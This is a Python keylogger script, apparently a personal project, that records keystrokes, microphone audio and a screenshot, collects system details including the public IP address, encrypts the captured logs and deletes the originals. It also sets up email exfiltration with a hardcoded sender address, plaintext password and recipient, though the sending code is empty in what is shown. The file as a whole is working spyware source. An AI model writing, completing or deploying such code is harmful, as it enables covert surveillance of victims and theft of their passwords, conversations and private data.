#All the libraries we'll use
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_info= "systeminfo.txt"
microfone_time = 10
time_iteration =15
audio_file= "audio.wav"
screenshot_info = "screenshot.png"
keys_information_e = "e_key_log.txt"
system_info_e = "e_systeminfo.txt"
email_address = "johnpwn246@gmail.com"
password = "John123!"

username = getpass.getuser()

toaddr = "gara_of_sand@live.com"
key = "WqN1ZdTJLhiCkN6vhie5AJID2xPEKzPZEkZjbNSJYvQ="

file_path = "/Users/danielramirez/Documents/Keylogger/Project"
extend = "/"
file_merge = file_path + extend


#email controls


#get the computer info
def computer_info():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address")
        
        f.write("Processor: " + (platform.processor()) + '\n' )
        f.write("System" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address" + IPAddr + "\n")
computer_info()

#get the microphone
def microfone():
    fs = 48000
    seconds = microfone_time
    
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()
    
    write(file_path + extend + audio_file,fs,myrecording)
microfone()

#get the screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)




#timer for keylogger
count = 0
keys = []

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
        #first convert the key to string and then replace every single quote with nothing, for instance, instead of seeing 'h''e''l' you will see hello
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 
    
    
        
screenshot()


#encrypt files
files_to_encrypt = [file_merge + system_info, file_merge + keys_information]
encrypted_files_names = [file_merge + system_info_e, file_merge + keys_information_e]

count =0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    
    with open(encrypted_files_names[count], 'wb') as f:
        f.write(encrypted)
    
    count += 1
time.sleep(120)


delete_files = [system_info, keys_information]
for file in delete_files:
    os.remove(file_merge + file)